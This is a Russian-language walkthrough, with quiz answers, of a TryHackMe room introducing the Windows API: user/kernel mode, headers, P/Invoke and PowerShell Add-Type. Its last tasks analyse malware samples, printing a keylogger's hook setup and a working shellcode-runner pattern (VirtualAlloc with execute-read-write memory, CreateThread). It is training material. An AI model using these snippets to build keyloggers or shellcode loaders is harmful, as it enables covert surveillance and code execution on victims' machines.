[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Introduction to Windows API](https://tryhackme.com/r/room/windowsapi) 

Всего 10 заданий:
## Задание 1
Windows API предоставляет собственные функции для взаимодействия с ключевыми компонентами операционной системы 
Windows. API широко используется многими, включая участников Red Team, участников Threat Actors, участников Blue 
Team, разработчиков программного обеспечения и поставщиков решений.  

API может легко интегрироваться с системой Windows, предлагая свой спектр вариантов использования. Вы можете увидеть,
что Win32 API используется для разработки наступательных инструментов и вредоносного ПО, проектирования EDR 
(Endpoint  Detection & R  esponse ) и общих программных  приложений . Для получения дополнительной информации обо 
всех вариантах использования API ознакомьтесь с  Windows API Index.   

#### Цели обучения
- Понять, что такое Windows API, каковы варианты его использования и как он взаимодействует с подсистемами ОС.
- Узнайте, как реализовать Windows API на разных языках.
- Понять, как API Windows может быть использовано со злонамеренной точки зрения, и разобрать несколько практических 
  примеров.
- Перед началом этой комнаты мы рекомендуем иметь общее представление об архитектуре операционной системы. Базовые 
знания программирования также приветствуются, но не являются обязательными. 

Цель этого класса — научить Windows API на фундаментальном уровне. Мы кратко рассмотрим реализации Win32 API , но 
сосредоточимся на том, почему и где используются вызовы API. 

Пожалуйста, пристегните ремни безопасности и найдите ближайший выход.

### Ответьте на вопросы ниже
Прочитайте вышеизложенное и перейдите к следующему заданию.
```commandline
Ответ не нужен
```

## Задание 2
Программам часто требуется доступ или изменение подсистем или оборудования Windows, но они ограничены для 
поддержания стабильности машины. Чтобы решить эту проблему, Microsoft выпустила Win32 API , библиотеку для 
взаимодействия между приложениями пользовательского режима и ядром.

Windows различает доступ к оборудованию по двум различным режимам: режим пользователя и режим ядра . Эти режимы 
определяют, к какому оборудованию, ядру и памяти разрешен доступ приложению или драйверу. API или системные вызовы 
взаимодействуют между каждым режимом, отправляя информацию в систему для обработки в режиме ядра.  

Пользовательский режим	Режим ядра
Нет прямого доступа к оборудованию
Прямой доступ к оборудованию
Доступ к «собственным» ячейкам памяти
Доступ ко всей физической памяти
Дополнительную информацию об управлении памятью можно найти в  разделе «Внутреннее устройство Windows».

Ниже приведено визуальное представление того, как пользовательское приложение может использовать вызовы API для 
изменения компонентов ядра. 

Диаграмма, показывающая пользовательский режим вверху и режим ядра внизу, разделенные точкой переключения

При рассмотрении того, как языки взаимодействуют с API Win32, этот процесс может еще больше усложниться: приложение 
пройдет через среду выполнения языка, прежде чем пройдет через API. 

Более подробную информацию о среде выполнения можно найти в разделе Уклонение от обнаружения во время выполнения .

### Ответьте на вопросы ниже
Имеет ли процесс в пользовательском режиме прямой доступ к оборудованию? (Да/Нет)
```commandline
N
```
Открывает ли запуск приложения от имени администратора процесс в режиме ядра? (Да/Нет)
```commandline
N
```

## Задание 3
Win32 API , более известный как Windows API, имеет несколько зависимых компонентов, которые используются для 
определения структуры и организации API. 

Давайте разберем Win32 API с помощью подхода сверху вниз. Предположим, что API — это верхний уровень, а параметры, 
составляющие конкретный вызов, — нижний уровень. В таблице ниже мы опишем структуру сверху вниз на высоком уровне и 
более подробно рассмотрим ее позже.

### Ответьте на вопросы ниже
Какой заголовочный файл импортирует и определяет DLL-библиотеку и структуру User32?
```commandline
winuser.h
```
Какой родительский заголовочный файл содержит все остальные необходимые дочерние и основные заголовочные файлы?
```commandline
windows.h
```

## Задание 4
Каждый вызов API библиотеки Win32 находится в памяти и требует указателя на адрес памяти. Процесс получения 
указателей на эти функции скрыт из-за  реализаций ASLR (Address Space Layout  Randomization ) ; каждый  язык или  
пакет имеет уникальную процедуру для преодоления ASLR. В этой комнате мы обсудим две самые популярные реализации:  
P/Invoke и  заголовочный файл Windows .   

В этом задании мы подробно рассмотрим теорию работы обеих реализаций, а в будущих заданиях применим их на практике.

Заголовочный файл Windows
Microsoft выпустила заголовочный файл Windows, также известный как загрузчик Windows, как прямое решение проблем, 
связанных с реализацией ASLR. Сохраняя концепцию на высоком уровне, во время выполнения загрузчик определит, какие 
вызовы выполняются, и создаст таблицу переходов для получения адресов функций или указателей.

К счастью, нам не придется погружаться глубже, чтобы продолжить работу с вызовами API , если мы этого не хотим.

После windows.hвключения файла в начало неуправляемой программы можно вызвать любую функцию Win32.

Мы рассмотрим эту концепцию на более практическом уровне в задании 6.

P/Вызов
Microsoft описывает P/Invoke или вызов платформы как «технологию, которая позволяет вам получать доступ к структурам,
обратным вызовам и функциям в неуправляемых библиотеках из вашего управляемого кода». 

P/invoke предоставляет инструменты для обработки всего процесса вызова неуправляемой функции из управляемого кода 
или, другими словами, вызова Win32 API. P/invoke начнется с импорта нужной DLL , содержащей неуправляемую функцию 
или вызов Win32 API. Ниже приведен пример импорта DLL с параметрами.  

```commandline
using System;
using System.Runtime.InteropServices;

public class Program
{
[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
...
} 
```
В приведенном выше коде мы импортируем DLL user32 , используя атрибут: DLLImport.

Примечание: точка с запятой не включена, поскольку функция p/invoke еще не завершена. На втором этапе мы должны 
определить управляемый метод как внешний. Ключевое слово externсообщит среде выполнения о конкретной DLL , которая 
была ранее импортирована. Ниже приведен пример создания внешнего метода.
```commandline
using System;
using System.Runtime.InteropServices;

public class Program
{
...
private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);
} 
```
Теперь мы можем вызвать функцию как управляемый метод, но мы вызываем неуправляемую функцию!

Мы рассмотрим эту концепцию на более практическом уровне в задании 7.

### Ответьте на вопросы ниже
Какое всеобъемлющее пространство имен предоставляет P/Invoke для .NET?
```commandline
system
```
Какое решение для защиты памяти скрывает процесс импорта вызовов API?
```commandline
ASLR
```

## Задание 5
Вызовы API являются вторым основным компонентом библиотеки Win32. Эти вызовы предлагают расширяемость и гибкость, 
которые могут быть использованы для удовлетворения множества вариантов использования. Большинство вызовов API Win32 
хорошо документированы в  документации Windows API и  pinvoke.net.

В этом задании мы рассмотрим вводный курс по схемам именования и входным/выходным параметрам вызовов API .

Функциональность вызова API может быть расширена путем изменения схемы именования и добавления репрезентативного 
символа. Ниже приведена таблица символов, поддерживаемых Microsoft для своей схемы именования. 

Бывший	Предоставляет расширенную функциональность или входные/выходные параметры для вызова API
Более подробную информацию об этой концепции можно найти в  документации Microsoft .

Каждый вызов API также имеет предопределенную структуру для определения своих входных/выходных параметров. Вы можете 
найти большинство этих структур на соответствующей странице документа вызова API в документации  Windows , вместе с 
пояснениями каждого параметра ввода/вывода.  

Давайте рассмотрим WriteProcessMemory вызов API в качестве примера. Ниже приведена структура ввода-вывода для вызова,
полученная здесь.
```commandline
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```
Для каждого параметра ввода-вывода Microsoft также поясняет его использование, ожидаемые входные или выходные данные 
и допустимые значения. 

Даже с объяснением определение этих значений иногда может быть сложным для определенных вызовов. Мы рекомендуем 
всегда исследовать и находить примеры использования вызовов API перед использованием вызова в вашем коде. 

### Ответьте на вопросы ниже
Какой символ, добавленный к вызову API, представляет кодировку ANSI?
```commandline
A
```
Какой символ, добавленный к вызову API, представляет расширенную функциональность?
```commandline
Ex
```
Каков тип выделения памяти 0x00080000 в вызове API VirtualAlloc?
```commandline
MEM_RESET
```

## Задание 6
Microsoft предоставляет низкоуровневые языки программирования, такие как C и C++, с предварительно настроенным 
набором библиотек, которые мы можем использовать для доступа к необходимым вызовам API.

Заголовочный windows.hфайл, как обсуждалось в задаче 4, используется для определения структур вызовов и получения 
указателей функций. Чтобы включить заголовок Windows, добавьте строку ниже к любой программе C или C++. 

#include <windows.h>

Давайте перейдем к созданию нашего первого вызова API . В качестве нашей первой цели мы стремимся создать 
всплывающее окно с заголовком: «Hello THM !» с помощью CreateWindowExA. Чтобы повторить то, что было рассмотрено в 
задаче 5, давайте рассмотрим входные/выходные параметры вызова.  
```commandline
HWND CreateWindowExA(
  [in]           DWORD     dwExStyle, // Optional windows styles
  [in, optional] LPCSTR    lpClassName, // Windows class
  [in, optional] LPCSTR    lpWindowName, // Windows text
  [in]           DWORD     dwStyle, // Windows style
  [in]           int       X, // X position
  [in]           int       Y, // Y position
  [in]           int       nWidth, // Width size
  [in]           int       nHeight, // Height size
  [in, optional] HWND      hWndParent, // Parent windows
  [in, optional] HMENU     hMenu, // Menu
  [in, optional] HINSTANCE hInstance, // Instance handle
  [in, optional] LPVOID    lpParam // Additional application data
);
```
Давайте возьмем эти предопределенные параметры и назначим им значения. Как упоминалось в задаче 5, каждый параметр 
для вызова API имеет объяснение своего назначения и потенциальных значений. Ниже приведен пример полного вызова 
CreateWindowsExA.

```commandline
HWND hwnd = CreateWindowsEx(
	0, 
	CLASS_NAME, 
	L"Hello THM!", 
	WS_OVERLAPPEDWINDOW, 
	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 
	NULL, 
	NULL, 
	hInstance, 
	NULL
	);
```
Мы определили наш первый вызов API на языке C! Теперь мы можем реализовать его в приложении и использовать 
функциональность вызова API . Ниже приведен пример приложения, которое использует API для создания небольшого 
пустого окна.  

```commandline
BOOL Create(
        PCWSTR lpWindowName,
        DWORD dwStyle,
        DWORD dwExStyle = 0,
        int x = CW_USEDEFAULT,
        int y = CW_USEDEFAULT,
        int nWidth = CW_USEDEFAULT,
        int nHeight = CW_USEDEFAULT,
        HWND hWndParent = 0,
        HMENU hMenu = 0
        )
    {
        WNDCLASS wc = {0};

        wc.lpfnWndProc   = DERIVED_TYPE::WindowProc;
        wc.hInstance     = GetModuleHandle(NULL);
        wc.lpszClassName = ClassName();

        RegisterClass(&wc);

        m_hwnd = CreateWindowEx(
            dwExStyle, ClassName(), lpWindowName, dwStyle, x, y,
            nWidth, nHeight, hWndParent, hMenu, GetModuleHandle(NULL), this
            );

        return (m_hwnd ? TRUE : FALSE);
    }
```
В случае успеха мы должны увидеть окно с заголовком «Hello THM !».

Как было показано в ходе выполнения этой задачи, низкоуровневые языки позволяют очень легко и быстро определить 
вызов API . Благодаря простоте использования и расширяемости языки на основе C являются наиболее популярными как 
среди субъектов угроз, так и среди поставщиков.

### Ответьте на вопросы ниже
Нужно ли вам определять структуру для использования вызовов API в C? (Да/Нет)

```commandline
N
```

## Задание 7
Как обсуждалось в задаче 4,  P/Invoke  позволяет нам импортировать DLL и назначать указатели на вызовы API .

Чтобы понять, как реализован P/Invoke, давайте сразу перейдем к примеру ниже, а затем обсудим отдельные компоненты.

```commandline
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}
```
Функция класса хранит определенные вызовы API и определение, на которое можно ссылаться во всех будущих методах.

Библиотека, в которой хранится структура вызова APIDllImport , теперь должна быть импортирована с помощью . 
Импортированные DLL действуют аналогично пакетам заголовков, но требуют импорта определенной DLL с вызовом API, 
который вы ищете. Вы можете обратиться к  индексу API или  pinvoke.net , чтобы определить, где в DLL находится 
конкретный вызов API .   

Из импорта DLL мы можем создать новый указатель на вызов API , который мы хотим использовать, в частности, 
определенный с помощью intPtr. В отличие от других низкоуровневых языков, вы должны указать структуру 
входных/выходных параметров в указателе. Как обсуждалось в задаче 5, мы можем найти входные/выходные параметры для 
требуемого вызова API в документации Windows.   

Теперь мы можем реализовать определенный вызов API в приложении и использовать его функциональность. Ниже приведен 
пример приложения, которое использует API для получения имени компьютера и другой информации об устройстве, на 
котором оно запущено.  

```commandline
class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
}

static void Main(string[] args) {
	bool success;
	StringBuilder name = new StringBuilder(260);
	uint size = 260;
	success = GetComputerNameA(name, ref size);
	Console.WriteLine(name.ToString());
}
```
В случае успеха программа должна вернуть имя компьютера текущего устройства.

Теперь, когда мы рассмотрели, как это можно сделать в .NET, давайте рассмотрим, как можно адаптировать тот же 
синтаксис для работы в PowerShell.

Определение вызова API почти идентично реализации .NET, но нам потребуется создать метод вместо класса и добавить 
несколько дополнительных операторов. 

```commandline

$MethodDefinition = @"
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@;
```
Вызовы теперь определены, но PowerShell требует еще один шаг, прежде чем они могут быть инициализированы. Мы должны 
создать новый тип для указателя каждой библиотеки Win32 DLL в определении метода. Функция Add-Typeпоместит временный 
файл в /tempкаталог и скомпилирует необходимые функции с помощью csc.exe. Ниже приведен пример используемой функции.

`$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;`
Теперь мы можем использовать необходимые вызовы API с помощью приведенного ниже синтаксиса.

`[Win32.Kernel32]::<Imported Call>()`

### Ответьте на вопросы ниже
Какой метод используется для импорта необходимой DLL?
```commandline
DllImport
```
Какой тип метода используется для ссылки на вызов API для получения структуры?
```commandline
External
```

## Задание 8
Несколько вызовов API в библиотеке Win32 легко могут быть использованы для вредоносной активности.

Несколько организаций попытались задокументировать и организовать все доступные вызовы API с вредоносными векторами, 
включая  SAN и  MalAPI.io. 

Хотя многие вызовы используются не по назначению, некоторые из них встречаются в дикой природе чаще, чем другие. 
Ниже приведена таблица наиболее часто используемых API , организованная по частоте в коллекции образцов. 

Изменяет защиту области памяти в виртуальном адресном пространстве вызывающего процесса.
В следующем задании мы подробно рассмотрим, как эти вызовы используются не по назначению, на примере двух образцов 
вредоносного ПО. 

### Ответьте на вопросы ниже
Какой вызов API возвращает адрес экспортированной функции DLL?
```commandline
GetProcAddress
```
Какой вызов API импортирует указанную DLL в адресное пространство вызывающего процесса?
```commandline
LoadLibrary
```

## Задание 9
Теперь, когда мы понимаем основные реализации библиотеки Win32 и часто используемые вызовы API , давайте разберем 
два образца вредоносного ПО и посмотрим, как взаимодействуют их вызовы. 

В этом задании мы разберем C# кейлоггер и программу запуска шелл-кода.

Кейлоггер
Чтобы начать анализировать кейлоггер, нам нужно собрать, какие вызовы API и хуки он реализует. Поскольку кейлоггер 
написан на C#, он должен использовать P/Invoke для получения указателей для каждого вызова. Ниже приведен фрагмент 
определений p/invoke исходного кода образца вредоносного ПО.  
```commandline
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetModuleHandle(string lpModuleName);
private static int WHKEYBOARDLL = 13;
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr GetCurrentProcess();
```
Ниже приведено объяснение каждого вызова API и его соответствующего использования.
Чтобы сохранить этическую целостность этого исследования случая, мы не будем рассматривать, как образец собирает каждое нажатие клавиши. Мы проанализируем, как образец устанавливает перехват на текущий процесс. Ниже приведен фрагмент раздела перехвата исходного кода образца вредоносного ПО.
```commandline
public static void Main() {
	_hookID = SetHook(_proc);
	Application.Run();
	UnhookWindowsHookEx(_hookID);
	Application.Exit();
}
private static IntPtr SetHook(LowLevelKeyboardProc proc) {
	using (Process curProcess = Process.GetCurrentProcess()) {
		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
	}
}
```
Давайте разберемся с целью и процедурой работы кейлоггера, а затем назначим им соответствующий вызов API из 
приведенного выше фрагмента. 

Используя  документацию Windows API  и контекст приведенного выше фрагмента, начните анализировать кейлоггер, 
используя вопросы 1–4 в качестве руководства для работы с образцом.  

Запуск шеллкода
Чтобы начать анализировать загрузчик шеллкода, нам снова нужно собрать, какие вызовы API он реализует. Этот процесс 
должен выглядеть идентично предыдущему исследованию случая. Ниже приведен фрагмент определений p/invoke исходного 
кода образца вредоносного ПО.  
```commandline
private static UInt32 MEM_COMMIT = 0x1000;
private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
```
Ниже приведено объяснение каждого вызова API и его соответствующего использования.

Теперь мы проанализируем, как шелл-код записывается в память и выполняется из нее.
```commandline
UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;
hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
WaitForSingleObject(hThread, 0xFFFFFFFF);
return;
```
Давайте разберемся с целью и процедурой выполнения шелл-кода, а затем назначим им соответствующий вызов API из 
приведенного выше фрагмента. 

Используя документацию Windows API и контекст приведенного выше фрагмента, начните анализировать загрузчик шелл-кода,
используя вопросы 5–8 в качестве руководства для работы с примером.   

### Ответьте на вопросы ниже
Какой вызов Win32 API используется для получения псевдодескриптора нашего текущего процесса в образце кейлоггера?
```commandline
GetCurrentProcess
```
Какой вызов Win32 API используется для установки перехвата на наш текущий процесс  в примере кейлоггера ?
```commandline
SetWindowsHookEx
```
Какой вызов Win32 API используется для получения дескриптора из псевдодескриптора  в образце кейлоггера ?
```commandline
GetModuleHandle
```
Какой вызов Win32 API используется для сброса перехвата в нашем текущем процессе  в примере кейлоггера ?
```commandline
UnhookWindowsHookEx
```
Какой вызов Win32 API используется для выделения памяти под размер шелл-кода  в примере средства запуска шелл-кода ?
```commandline
VirtualAlloc
```
Какой собственный метод используется для записи шелл-кода в выделенный раздел памяти  в примере запуска шелл-кода ?
```commandline
Marshal.copy
```
Какой вызов Win32 API используется для создания нового потока выполнения  в примере запуска шеллкода ?
```commandline
CreateThread
```
Какой вызов Win32 API используется для ожидания завершения потока  в примере запуска шелл-кода?
```commandline
WaitForSingleObject
```

## Задание 10
Это конец основ Windows API . Функциональность и расширяемость API имеют много других возможностей и приложений, 
которые мы не упомянули в этой комнате. 

API Windows может быть полезен для различных вариантов использования, поскольку мы продолжим обсуждать и изучать его 
в рамках пути красной команды и других комнат на TryHackMe. 

### Ответьте на вопросы ниже
Прочитайте вышеизложенное и продолжайте обучение!
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)